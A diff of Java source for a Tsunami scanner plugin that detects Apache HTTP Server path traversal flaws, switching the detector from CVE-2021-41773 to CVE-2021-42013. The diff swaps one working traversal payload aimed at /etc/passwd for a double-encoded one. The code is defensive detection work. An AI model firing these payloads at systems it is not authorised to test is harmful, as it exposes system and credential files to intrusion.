@@ -1,4 +1,4 @@
-package com.google.tsunami.plugins.detectors.rce.cve202125646;
+package com.google.tsunami.plugins.detectors.pathtraversal.cve202142013;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
@@ -31,18 +31,18 @@ import java.util.regex.Pattern;
 import javax.inject.Inject;
 
 /**
- * A {@link VulnDetector} that detects the CVE-2021-41773 vulnerability.
+ * A {@link VulnDetector} that detects the CVE-2021-42013 vulnerability.
  */
 @PluginInfo(
     type = PluginType.VULN_DETECTION,
-    name = "ApacheHttpServerCVE202141773VulnDetector",
+    name = "ApacheHttpServerCVE202142013VulnDetector",
     version = "1.0",
-    description = "This detector checks for Apache HTTP Server 2.4.49 Path traversal and "
-        + "disclosure vulnerability.",
+    description = "This detector checks for Apache HTTP Server 2.4.49 and 2.4.50 "
+        + "path traversal and remote code execution vulnerability (CVE-2021-42013).",
     author = "threedr3am (qiaoer1320@gmail.com)",
-    bootstrapModule = ApacheHttpServerCVE202141773VulnDetectorBootstrapModule.class
+    bootstrapModule = ApacheHttpServerCVE202142013VulnDetectorBootstrapModule.class
 )
-public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {
+public class ApacheHttpServerCVE202142013VulnDetector implements VulnDetector {
 
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
@@ -78,7 +78,7 @@ public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {
           "scripts");
 
   @Inject
-  ApacheHttpServerCVE202141773VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
+  ApacheHttpServerCVE202142013VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
     this.utcClock = checkNotNull(utcClock);
     this.httpClient = checkNotNull(httpClient);
   }
@@ -106,12 +106,11 @@ public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {
   }
 
   private boolean checkUrlWithCommonDirectory(NetworkService networkService, String directory) {
-    String payload =
-        "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd";
-    String targetUri =
-        String.format(
-            "%s%s%s",
-            NetworkServiceUtils.buildWebApplicationRootUrl(networkService), directory, payload);
+    String payload = "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"
+        + "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"
+        + "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd";
+    String targetUri = String.format("%s%s%s",
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService), directory, payload);
     try {
       HttpResponse response = httpClient.send(get(targetUri).withEmptyHeaders().build(),
           networkService);
@@ -138,22 +137,22 @@ public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {
             Vulnerability.newBuilder()
                 .setMainId(
                     VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
-                        .setValue("CVE_2021_41773"))
+                        .setValue("CVE_2021_42013"))
                 .setSeverity(Severity.HIGH)
-                .setTitle("Apache HTTP Server 2.4.49 Path traversal and disclosure vulnerability")
+                .setTitle("Path Traversal and Remote Code Execution in "
+                    + "Apache HTTP Server 2.4.49 and 2.4.50")
                 .setDescription(
-                    "A flaw was found in a change made to path normalization in Apache HTTP Server "
-                        + "2.4.49. An attacker could use a path traversal attack to map URLs to "
-                        + "files outside the expected document root."
-                        + "If files outside of the document root "
-                        + "are not protected by \"require all denied\" these requests can succeed. "
-                        + "Additionally this flaw could leak the source of interpreted files "
-                        + "like CGI scripts."
-                        + "This issue is known to be exploited in the wild."
-                        + "This issue only affects Apache 2.4.49 and not earlier versions."
-                        + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773 "
-                        + "https://httpd.apache.org/security/vulnerabilities_24.html")
-                .setRecommendation("Update 2.4.50 released.")
+                    "It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 "
+                        + "was insufficient. An attacker could use a path traversal attack to "
+                        + "map URLs to files outside the directories configured by Alias-like "
+                        + "directives.\n"
+                        + "If files outside of these directories are not protected by the "
+                        + "usual default configuration \"require all denied\", these requests "
+                        + "can succeed. If CGI scripts are also enabled for these aliased pathes, "
+                        + "this could allow for remote code execution.\n"
+                        + "https://httpd.apache.org/security/vulnerabilities_24.html\n"
+                        + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42013")
+                .setRecommendation("Update 2.4.51 released.")
         )
         .build();
   }
